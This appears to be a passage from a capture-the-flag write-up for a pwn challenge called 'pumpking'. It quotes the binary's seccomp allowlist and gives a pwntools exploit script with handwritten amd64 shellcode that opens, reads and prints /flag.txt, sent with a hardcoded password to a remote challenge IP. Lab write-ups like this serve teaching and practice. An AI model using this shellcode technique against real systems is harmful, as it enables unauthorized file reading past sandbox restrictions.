Initial password, then it reads in our input and calls to it.
It uses seccomp to limit our available syscalls:

```c
v1 = seccomp_init(0LL);
seccomp_rule_add(v1, 0x7FFF0000LL, 257LL, 0LL); // openat()
seccomp_rule_add(v1, 0x7FFF0000LL, 0LL, 0LL);   // read()
seccomp_rule_add(v1, 0x7FFF0000LL, 60LL, 0LL);  // exit()
seccomp_rule_add(v1, 0x7FFF0000LL, 1LL, 0LL);   // write()
seccomp_rule_add(v1, 0x7FFF0000LL, 15LL, 0LL);  // rt_sigreturn()
seccomp_load(v1);
```

---

## Exploit script

Used pwndbg through pwntools to debug the shellcode.
Leaving it in for inevitable future reference.

```python
from pwn import *

context.arch = "amd64"
assembly = """

// openat(AT_FDCWD, "/flag.txt", O_RDONLY, mode)

	xor r10, r10
	xor rdx, rdx
	xor rax, rax
	push rax
	mov rax, 0x7478742e67616c66
	push rax
	mov rsi, rsp
	mov rdi, -100
	mov rax, 0x101
	syscall

// read(flag_fd, rsp, 100)

	mov rdx, 100
	mov rsi, rsp
	mov rdi, rax
	xor rax, rax
	syscall

// write(stdout, rsp, read_count)

	mov rdx, rax
	mov rsi, rsp
	mov rdi, 1
	mov rax, 1
	syscall

// exit(69)

	mov rdi, 69
	mov rax, 60
	syscall

"""

gdbscript = """

set pagination off
set breakpoint pending on

b setup
b king

c
"""

payload = asm(assembly)
password = b"pumpk1ngRulez"

with remote("161.35.162.249", 32390, level="Debug") as r:
#with gdb.debug("/home/kali/Downloads/challenge/pumpking", gdbscript=gdbscript) as r:

	r.sendline(password)
	r.recvuntil(b">>")
	r.send(payload)
	info(r.recvrepeat(1))
	
```